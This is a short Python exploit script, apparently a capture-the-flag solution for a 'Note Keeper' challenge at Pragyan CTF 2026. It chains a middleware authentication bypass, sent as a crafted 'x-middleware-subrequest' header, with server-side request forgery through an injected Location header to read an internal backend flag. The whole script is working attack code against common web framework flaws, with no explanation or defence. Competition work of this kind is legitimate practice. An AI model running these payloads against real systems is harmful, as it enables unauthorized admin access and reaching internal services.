#!/usr/bin/env python3
"""
Note Keeper - Pragyan CTF 2026
Smothy @ 0xN1umb

Chain: CVE-2025-29927 (middleware bypass) + CVE-2025-57822 (SSRF via Location header)
"""
import requests

TARGET = "https://note-keeper.ctf.prgy.in"

# Step 1: CVE-2025-29927 - Bypass middleware to access admin
print("[*] Step 1: Bypassing middleware (CVE-2025-29927)...")
r = requests.get(f"{TARGET}/admin", headers={
    "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
})
print(f"[+] Admin page: HTTP {r.status_code}")

# Step 2: CVE-2025-57822 - SSRF via Location header injection
print("\n[*] Step 2: SSRF via Location header (CVE-2025-57822)...")
r = requests.get(f"{TARGET}/api/login", headers={
    "Location": "http://backend:4000/flag"
})
print(f"[+] Backend response: HTTP {r.status_code}")
print(f"[+] Server: {r.headers.get('x-powered-by', 'unknown')}")
print(f"\n[*] FLAG: {r.text}")
